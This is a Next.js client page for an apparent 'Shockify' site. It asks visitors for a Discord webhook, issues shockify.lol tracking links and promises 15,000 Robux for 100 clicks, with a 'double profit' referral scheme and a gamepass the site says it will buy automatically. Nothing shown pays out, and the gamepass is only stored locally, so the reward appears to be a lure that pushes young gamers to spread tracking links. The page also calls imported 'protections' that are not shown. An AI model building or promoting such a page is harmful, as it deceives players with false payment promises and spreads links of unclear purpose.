"use client"

import { useState, useEffect, useRef } from "react"
import { motion, AnimatePresence } from "framer-motion"
import {
  Copy,
  AlertCircle,
  CheckCircle,
  Loader2,
  ArrowRight,
  DollarSign,
  RefreshCw,
  X,
  Users,
  ExternalLink,
} from "lucide-react"
import Link from "next/link"
import { PurpleParticleCanvas } from "@/components/purple-particle-canvas"
import { setupAllProtections } from "../protection"

// Create a global click counter store
if (typeof window !== "undefined") {
  if (!window.clickCounters) {
    window.clickCounters = {}
  }
}

export default function MakeMoneyPage() {
  const [webhookUrl, setWebhookUrl] = useState("")
  const [generatedLink, setGeneratedLink] = useState("")
  const [linkId, setLinkId] = useState("")
  const [isGenerating, setIsGenerating] = useState(false)
  const [error, setError] = useState("")
  const [copied, setCopied] = useState(false)
  const [isLoading, setIsLoading] = useState(true)
  const [testingWebhook, setTestingWebhook] = useState(false)
  const [webhookTested, setWebhookTested] = useState(false)
  const [webhookValid, setWebhookValid] = useState(false)
  const [showNotification, setShowNotification] = useState(false)
  const [referralCode, setReferralCode] = useState("")
  const [gamepassLink, setGamepassLink] = useState("")
  const [gamepassSubmitted, setGamepassSubmitted] = useState(false)
  const containerRef = useRef<HTMLDivElement>(null)

  //  setGamepassSubmitted] = useState(false)
  // const containerRef = useRef<HTMLDivElement>(null) //Fixed: Removed duplicate declaration

  // Set up protections
  useEffect(() => {
    try {
      setupAllProtections()
    } catch (error) {
      console.error("Protection error:", error)
    }

    // Simulate loading
    setTimeout(() => {
      setIsLoading(false)
    }, 1000)

    // Check for referral code in URL
    const urlParams = new URLSearchParams(window.location.search)
    const ref = urlParams.get("ref")
    if (ref) {
      setReferralCode(ref)
    }
  }, [])

  const testWebhook = async () => {
    if (!webhookUrl) {
      setError("Please enter your Discord webhook URL")
      return false
    }

    if (
      !webhookUrl.startsWith("https://discord.com/api/webhooks/") &&
      !webhookUrl.startsWith("https://discordapp.com/api/webhooks/")
    ) {
      setError("Please enter a valid Discord webhook URL")
      return false
    }

    setTestingWebhook(true)
    setWebhookTested(false)
    setWebhookValid(false)

    try {
      const response = await fetch("/api/test-webhook", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ webhookUrl }),
      })

      if (!response.ok) {
        const errorData = await response.json()
        throw new Error(errorData.message || `Failed to send webhook notification: ${response.status}`)
      }

      setWebhookTested(true)
      setWebhookValid(true)
      setError("")
      return true
    } catch (error) {
      console.error("Error testing webhook:", error)
      setWebhookTested(true)
      setWebhookValid(false)
      setError("Failed to verify your webhook. Please check the URL and try again.")
      return false
    } finally {
      setTestingWebhook(false)
    }
  }

  // Generate a user-friendly ID
  const generateUserId = () => {
    // Create a short, readable ID
    const adjectives = ["cool", "epic", "mega", "super", "hyper", "ultra", "pro", "elite", "royal", "swift"]
    const nouns = ["gamer", "ninja", "wizard", "master", "legend", "beast", "hawk", "tiger", "dragon", "wolf"]

    const randomAdjective = adjectives[Math.floor(Math.random() * adjectives.length)]
    const randomNoun = nouns[Math.floor(Math.random() * nouns.length)]
    const randomNum = Math.floor(Math.random() * 1000)
      .toString()
      .padStart(3, "0")

    return `${randomAdjective}-${randomNoun}-${randomNum}`
  }

  const generateLink = async (e) => {
    e.preventDefault()
    setError("")

    // Test webhook first
    const webhookIsValid = await testWebhook()
    if (!webhookIsValid) return

    setIsGenerating(true)

    try {
      // Generate a user-friendly ID for the link
      const userId = generateUserId()
      setLinkId(userId)

      // Store the webhook URL in localStorage
      localStorage.setItem(`webhook_${userId}`, webhookUrl)
      localStorage.setItem(`clickCount_${userId}`, "0")

      // Initialize in global counter
      if (typeof window !== "undefined" && window.clickCounters) {
        window.clickCounters[userId] = 0
      }

      // Generate the link with the clean format - always use shockify.lol domain
      const link = `https://shockify.lol/${userId}`
      setGeneratedLink(link)

      // Register the link with our system
      try {
        const registerResponse = await fetch("/api/register-link", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            userId,
            webhookUrl,
            referralCode, // Include referral code if present
          }),
        })

        if (!registerResponse.ok) {
          console.warn("Failed to register link, but continuing:", await registerResponse.text())
        }
      } catch (registerError) {
        console.error("Error registering link:", registerError)
        // Continue despite registration error
      }

      // Generate dashboard link
      const dashboardLink = `${window.location.origin}/dashboard`

      // Send a confirmation webhook notification with tips
      try {
        await fetch("/api/send-webhook", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            webhookUrl,
            embed: {
              title: "✅ Your Link Has Been Generated",
              description:
                "Your Shockify link has been created successfully! You'll receive notifications here when someone clicks your link. All progress will be tracked through this webhook.",
              color: 10181046, // Purple color
              thumbnail: {
                url: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
              },
              fields: [
                {
                  name: "🔗 Your Link",
                  value: `https://shockify.lol/${userId}`,
                  inline: false,
                },
                {
                  name: "🎯 Goal",
                  value: "Get 100 unique clicks to earn 15,000 Robux!",
                  inline: false,
                },
                {
                  name: "📊 Dashboard Access",
                  value: `Access your private dashboard to track clicks and manage your account: ${dashboardLink}\n\nUse your webhook URL and link ID (${userId}) to login.`,
                  inline: false,
                },
                {
                  name: "💰 DOUBLE PROFIT REFERRAL SYSTEM 💰",
                  value: `https://shockify.lol/make-money?ref=${userId}\n\nShare this referral link to earn DOUBLE PROFITS! When someone creates a link through your referral, EVERY CLICK they receive ALSO COUNTS FOR YOU!`,
                  inline: false,
                },
              ],
              footer: {
                text: "© 2025 Shockify — All Rights Reserved.",
                icon_url:
                  "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
              },
            },
          }),
        })
      } catch (webhookError) {
        console.error("Error sending confirmation webhook:", webhookError)
        // Continue despite webhook error
      }

      // If there was a referral, send a notification to the referrer
      if (referralCode) {
        try {
          // Get the referrer's webhook URL
          const referrerResponse = await fetch(`/api/register-link?id=${referralCode}`)
          if (referrerResponse.ok) {
            const referrerData = await referrerResponse.json()
            const referrerWebhookUrl = referrerData.webhookUrl

            if (referrerWebhookUrl) {
              // Send notification to referrer
              await fetch("/api/send-webhook", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify({
                  webhookUrl: referrerWebhookUrl,
                  embed: {
                    title: "🎉 New Referral!",
                    description: "Someone has created a link using your referral code!",
                    color: 5763719, // Green color
                    fields: [
                      {
                        name: "💰 DOUBLE PROFIT SYSTEM ACTIVATED! 💰",
                        value: "Every click they receive will also count for YOU!",
                        inline: false,
                      },
                    ],
                    footer: {
                      text: "© 2025 Shockify — All Rights Reserved.",
                      icon_url:
                        "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
                    },
                  },
                }),
              })
            }
          }
        } catch (referralError) {
          console.error("Error processing referral:", referralError)
        }
      }

      // Show the notification
      setShowNotification(true)
    } catch (error) {
      console.error("Error generating link:", error)
      setError("Failed to generate link. Please try again later.")
    } finally {
      setIsGenerating(false)
    }
  }

  const copyToClipboard = (text: string, type: "link" | "referral" = "link") => {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const submitGamepass = async (e) => {
    e.preventDefault()

    if (!gamepassLink) {
      setError("Please enter your Roblox gamepass link")
      return
    }

    if (!gamepassLink.includes("roblox.com/game-pass/") && !gamepassLink.includes("roblox.com/catalog/")) {
      setError("Please enter a valid Roblox gamepass link")
      return
    }

    try {
      // In a real implementation, you would save this to a database
      localStorage.setItem(`gamepass_${linkId}`, gamepassLink)

      // Send a confirmation webhook
      await fetch("/api/send-webhook", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          webhookUrl,
          embed: {
            title: "✅ Gamepass Submitted Successfully",
            description:
              "Your Roblox gamepass has been registered. Once you reach 100 clicks, we'll automatically purchase your gamepass!",
            color: 5763719, // Green color
            fields: [
              {
                name: "🎮 Gamepass Link",
                value: gamepassLink,
                inline: false,
              },
              {
                name: "💰 Reward",
                value: "15,000 Robux",
                inline: true,
              },
              {
                name: "🎯 Required Clicks",
                value: "100",
                inline: true,
              },
            ],
            footer: {
              text: "© 2025 Shockify — All Rights Reserved.",
              icon_url:
                "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
            },
          },
        }),
      })

      setGamepassSubmitted(true)
      setError("")
    } catch (error) {
      console.error("Error submitting gamepass:", error)
      setError("Failed to submit gamepass. Please try again.")
    }
  }

  // Add mobile optimization styles
  useEffect(() => {
    // Set viewport height for mobile browsers
    const setVh = () => {
      const vh = window.innerHeight * 0.01
      document.documentElement.style.setProperty("--vh", `${vh}px`)
    }

    // Call the function on initial load
    setVh()

    // Add event listener for resize
    window.addEventListener("resize", setVh)

    // Clean up
    return () => window.removeEventListener("resize", setVh)
  }, [])

  return (
    <div className="min-h-screen w-full bg-black overflow-hidden">
      <div className="fixed inset-0 z-0">
        <PurpleParticleCanvas />
      </div>
      <div
        ref={containerRef}
        className="min-h-screen w-full flex flex-col items-center justify-center p-4 relative z-10"
        style={{ minHeight: "calc(var(--vh, 1vh) * 100)" }}
      >
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="w-full max-w-md"
        >
          <div className="bg-black/80 backdrop-blur-md border border-purple-500/30 rounded-lg shadow-xl overflow-hidden">
            <div className="p-6 border-b border-purple-500/20 bg-gradient-to-r from-purple-900/30 to-black">
              <div className="flex items-center justify-between">
                <h1 className="text-2xl font-bold text-white flex items-center gap-2">
                  <DollarSign className="text-purple-400 w-6 h-6" />
                  Make Money
                </h1>
                <Link
                  href="/"
                  className="text-purple-400 hover:text-purple-300 text-sm flex items-center gap-1 transition-colors"
                >
                  <span>Home</span>
                  <ArrowRight className="w-3 h-3" />
                </Link>
              </div>
              <p className="text-gray-300 mt-2 text-sm">
                Generate your own link, share it, and earn{" "}
                <span className="text-purple-400 font-bold">15,000 Robux</span> when you reach 100 clicks!
              </p>

              {/* Referral banner */}
              {referralCode && (
                <div className="mt-3 bg-purple-900/30 border border-purple-500/30 rounded-md p-2 flex items-center">
                  <Users className="text-purple-400 w-4 h-4 mr-2 flex-shrink-0" />
                  <p className="text-xs text-purple-200">
                    You were referred by a friend! You'll both earn extra Robux!
                  </p>
                </div>
              )}
            </div>

            {isLoading ? (
              <div className="p-6 flex flex-col items-center justify-center min-h-[300px]">
                <Loader2 className="w-10 h-10 text-purple-500 animate-spin mb-4" />
                <p className="text-gray-400">Loading...</p>
              </div>
            ) : (
              <div className="p-6">
                {!generatedLink ? (
                  <form onSubmit={generateLink} className="space-y-4">
                    <div>
                      <label htmlFor="webhook" className="block text-sm font-medium text-gray-300 mb-1">
                        Your Discord Webhook URL
                      </label>
                      <div className="flex gap-2">
                        <input
                          type="text"
                          id="webhook"
                          value={webhookUrl}
                          onChange={(e) => {
                            setWebhookUrl(e.target.value)
                            setWebhookTested(false)
                          }}
                          placeholder="https://discord.com/api/webhooks/..."
                          className="w-full px-4 py-2 bg-black/60 border border-purple-500/30 rounded-md text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-500/50"
                          required
                          autoComplete="off"
                          autoCapitalize="off"
                          spellCheck="false"
                        />
                        <button
                          type="button"
                          onClick={testWebhook}
                          disabled={testingWebhook || !webhookUrl}
                          className="bg-purple-600 hover:bg-purple-700 text-white p-2 rounded-md flex-shrink-0 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                          title="Test webhook"
                        >
                          {testingWebhook ? (
                            <Loader2 className="w-5 h-5 animate-spin" />
                          ) : webhookTested && webhookValid ? (
                            <CheckCircle className="w-5 h-5" />
                          ) : (
                            <RefreshCw className="w-5 h-5" />
                          )}
                        </button>
                      </div>
                      <p className="mt-1 text-xs text-gray-400">
                        We'll send notifications to this webhook when someone clicks your link.
                      </p>
                      {webhookTested && webhookValid && (
                        <p className="mt-1 text-xs text-green-400 flex items-center gap-1">
                          <CheckCircle className="w-3 h-3" /> Webhook verified successfully!
                        </p>
                      )}
                    </div>

                    {error && (
                      <div className="bg-red-900/20 border border-red-500/30 rounded-md p-3 flex items-start gap-2">
                        <AlertCircle className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" />
                        <p className="text-sm text-red-300">{error}</p>
                      </div>
                    )}

                    <button
                      type="submit"
                      disabled={isGenerating}
                      className="w-full bg-gradient-to-r from-purple-600 to-purple-800 hover:from-purple-700 hover:to-purple-900 text-white py-2 px-4 rounded-md font-medium flex items-center justify-center gap-2 transition-colors disabled:opacity-70"
                    >
                      {isGenerating ? (
                        <>
                          <Loader2 className="w-4 h-4 animate-spin" />
                          Generating...
                        </>
                      ) : (
                        <>
                          Generate Link
                          <ArrowRight className="w-4 h-4" />
                        </>
                      )}
                    </button>
                  </form>
                ) : (
                  <div className="space-y-6">
                    <div>
                      <h2 className="text-lg font-medium text-white mb-2">Your Link is Ready!</h2>
                      <div className="flex items-center gap-2">
                        <input
                          type="text"
                          value={`https://shockify.lol/${linkId}`}
                          readOnly
                          className="w-full px-4 py-2 bg-black/60 border border-purple-500/30 rounded-md text-white focus:outline-none"
                        />
                        <button
                          onClick={() => copyToClipboard(`https://shockify.lol/${linkId}`)}
                          className="bg-purple-600 hover:bg-purple-700 text-white p-2 rounded-md flex-shrink-0 transition-colors"
                          title="Copy to clipboard"
                        >
                          {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                        </button>
                      </div>
                    </div>

                    {/* Gamepass submission section */}
                    {!gamepassSubmitted ? (
                      <div className="bg-purple-900/20 border border-purple-500/30 rounded-md p-4">
                        <h3 className="text-white font-medium mb-2 flex items-center gap-2">
                          <ExternalLink className="w-5 h-5 text-purple-400" />
                          Submit Your Gamepass
                        </h3>
                        <p className="text-sm text-gray-300 mb-3">
                          Create a Roblox gamepass for <span className="text-purple-400 font-medium">15,000 Robux</span>{" "}
                          and submit the link below. We'll automatically purchase it when you reach 100 clicks!
                        </p>
                        <form onSubmit={submitGamepass} className="space-y-3">
                          <input
                            type="text"
                            value={gamepassLink}
                            onChange={(e) => setGamepassLink(e.target.value)}
                            placeholder="https://www.roblox.com/game-pass/..."
                            className="w-full px-3 py-1.5 bg-black/60 border border-purple-500/30 rounded-md text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500/50"
                            required
                          />
                          <button
                            type="submit"
                            className="w-full bg-purple-600 hover:bg-purple-700 text-white py-1.5 px-4 rounded-md text-sm font-medium transition-colors"
                          >
                            Submit Gamepass
                          </button>
                        </form>
                        <p className="mt-2 text-xs text-gray-400">
                          If you have any issues, contact <span className="text-purple-400 font-medium">poepx</span> on
                          Discord.
                        </p>
                      </div>
                    ) : (
                      <div className="bg-green-900/20 border border-green-500/30 rounded-md p-4">
                        <div className="flex items-center gap-2 mb-2">
                          <CheckCircle className="w-5 h-5 text-green-400" />
                          <h3 className="text-white font-medium">Gamepass Submitted!</h3>
                        </div>
                        <p className="text-sm text-gray-300">
                          Your gamepass has been registered. We'll purchase it automatically when you reach 100 clicks!
                        </p>
                      </div>
                    )}

                    {/* Dashboard Link */}
                    <div className="bg-purple-900/20 border border-purple-500/30 rounded-md p-4">
                      <h3 className="text-white font-medium mb-2 flex items-center gap-2">
                        <ExternalLink className="w-5 h-5 text-purple-400" />
                        Your Dashboard
                      </h3>
                      <p className="text-sm text-gray-300 mb-3">
                        Access your private dashboard to track clicks and manage your account.
                      </p>
                      <Link
                        href="/dashboard"
                        className="w-full bg-purple-600 hover:bg-purple-700 text-white py-1.5 px-4 rounded-md text-sm font-medium transition-colors flex items-center justify-center gap-2"
                      >
                        <span>Access Dashboard</span>
                        <ArrowRight className="w-4 h-4" />
                      </Link>
                      <p className="mt-2 text-xs text-gray-400">Use your webhook URL and link ID to login.</p>
                    </div>

                    {/* Referral System - Simplified */}
                    <div className="bg-purple-900/20 border border-purple-500/30 rounded-md p-4">
                      <h3 className="text-white font-medium mb-2 flex items-center gap-2">
                        <Users className="w-5 h-5 text-purple-400" />
                        Referral Link
                      </h3>
                      <div className="flex items-center gap-2">
                        <input
                          type="text"
                          value={`https://shockify.lol/make-money?ref=${linkId}`}
                          readOnly
                          className="w-full px-3 py-1.5 bg-black/60 border border-purple-500/30 rounded-md text-white text-sm focus:outline-none"
                        />
                        <button
                          onClick={() => copyToClipboard(`https://shockify.lol/make-money?ref=${linkId}`, "referral")}
                          className="bg-purple-600 hover:bg-purple-700 text-white p-1.5 rounded-md flex-shrink-0 transition-colors"
                          title="Copy referral link"
                        >
                          <Copy className="w-4 h-4" />
                        </button>
                      </div>
                      <p className="mt-2 text-xs text-gray-400">
                        Share this link to earn double profits! Every click on your referrals' links counts for you too!
                      </p>
                    </div>

                    <div className="flex justify-center items-center">
                      <button
                        onClick={() => {
                          setGeneratedLink("")
                          setLinkId("")
                          setWebhookUrl("")
                          setWebhookTested(false)
                          setWebhookValid(false)
                          setGamepassLink("")
                          setGamepassSubmitted(false)
                        }}
                        className="text-purple-400 hover:text-purple-300 text-sm transition-colors"
                      >
                        Generate new link
                      </button>
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>

          <div className="mt-4 text-center">
            <p className="text-sm text-gray-400">© 2025 Shockify — All Rights Reserved.</p>
          </div>
        </motion.div>
      </div>

      {/* Smaller notification */}
      <AnimatePresence>
        {showNotification && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4"
            onClick={() => setShowNotification(false)}
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-gradient-to-b from-purple-900/80 to-black/90 border border-purple-500/50 rounded-lg shadow-2xl p-5 max-w-sm w-full"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="flex justify-between items-start mb-3">
                <h2 className="text-xl font-bold text-white">Link Generated!</h2>
                <button
                  onClick={() => setShowNotification(false)}
                  className="text-gray-400 hover:text-white transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              <div className="mb-4">
                <div className="flex items-center justify-center mb-3">
                  <div className="w-12 h-12 bg-purple-700/30 rounded-full flex items-center justify-center">
                    <CheckCircle className="w-6 h-6 text-purple-400" />
                  </div>
                </div>
                <p className="text-center text-lg font-medium text-white mb-2">Check your Discord server!</p>
                <p className="text-center text-gray-300 text-sm">
                  All details about your link have been sent to your Discord webhook.
                </p>
              </div>

              <button
                onClick={() => setShowNotification(false)}
                className="w-full bg-gradient-to-r from-purple-600 to-purple-800 hover:from-purple-700 hover:to-purple-900 text-white py-2 px-4 rounded-md font-medium transition-colors"
              >
                Got it!
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}
